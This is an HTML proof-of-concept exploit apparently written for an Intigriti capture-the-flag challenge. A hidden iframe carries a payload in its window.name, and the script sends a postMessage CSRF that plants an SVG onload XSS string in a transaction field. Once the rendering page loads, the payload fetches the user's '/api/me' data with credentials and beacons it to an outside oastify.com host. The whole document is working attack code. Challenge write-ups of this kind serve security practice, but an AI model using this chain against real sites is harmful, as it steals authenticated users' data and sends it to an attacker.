<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Exploit</title>
</head>
<body>
    <iframe 
        id="frame" 
        name="fetch('/api/me', {credentials: 'include'}).then(r=>r.json()).then(d=>{ navigator.sendBeacon('http://t60cu91colpt3lv8btizc8fuslycm8ax.oastify.com?flag='+encodeURIComponent(d.flag)) })"
        src="https://challenge-0126.intigriti.io/checkout.html" 
        style="opacity:0;width:0;height:0">
    </iframe>

    <script>
        const TARGET = "https://challenge-0126.intigriti.io";
        const frame = document.getElementById('frame');

        // Tiny injection: Breaks the title attribute and evals window.name
        const tiny_xss = `"><svg/onload=eval(name)>`;

        frame.onload = () => {
            setTimeout(() => {
                // 1. CSRF: Force the bot to create the malicious transaction
                frame.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: tiny_xss, 
                        currency: '1337COIN', // Using the special currency
                        amount: 1337
                    }
                }, '*');

                // 2. Trigger: Redirect the iframe to the page where the transaction (and XSS) is rendered
                // This ensures window.name persists to the new page
                setTimeout(() => {
                    frame.contentWindow.location = TARGET + '/marketwatch.html';
                }, 2000); 
            }, 1000);
        };
    </script>
</body>
</html>
